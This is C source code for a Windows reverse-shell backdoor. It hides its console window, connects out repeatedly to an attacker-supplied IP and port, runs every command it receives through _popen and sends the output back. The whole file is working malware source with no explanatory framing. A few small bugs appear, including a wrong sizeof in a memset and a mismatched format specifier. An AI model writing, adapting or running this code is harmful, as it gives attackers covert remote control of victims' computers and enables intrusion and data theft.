#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

static int sock;

static void shell()
{
	while (TRUE)
	{
		char buffer[1024];
		memset(buffer, 0, sizeof(buffer));
		recv(sock, buffer, sizeof(buffer), 0);

		if (strncmp("q", buffer, 1) == 0)
			return;
		
		FILE* fp = _popen(buffer, "r");
		if (!fp) exit(-1);

		char container[1024];
		char total_response[16384] = "";
		memset(container, 0, sizeof(container));
		while (fgets(container, 1024, fp) != NULL)
		{
			strcat(total_response, container);
		}
		send(sock, total_response, sizeof(total_response), 0);
		fclose(fp);
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
	if (__argc != 3)
	{
		printf("Usage: %s <remote_ip> <remote_port>\n", __argv[0]);
		return 0;
	}

	char* remoteIP = __argv[1];
	int remotePort = atoi(__argv[2]);
	if ((remotePort < 0) || (remotePort > 65535))
	{
		fprintf(stderr, "Invalid port value \"%s\" must be in range 0..65535\n",
			remotePort);
		exit(-1);
	}

	AllocConsole();
	HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
	
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
	{
		fprintf(stderr, "Error initializing WSA\n");
		exit(-1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in sockAddr;
	memset(&sockAddr, 0, sizeof(remoteIP));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = inet_addr(remoteIP);
	sockAddr.sin_port = htons((unsigned short)remotePort);

start :

	while (connect(sock, (struct sockaddr *)&sockAddr, sizeof(sockAddr)) != 0)
	{
		Sleep(1);
		goto start;
	}

	shell();

	closesocket(sock);
	WSACleanup();
	return 0;
}

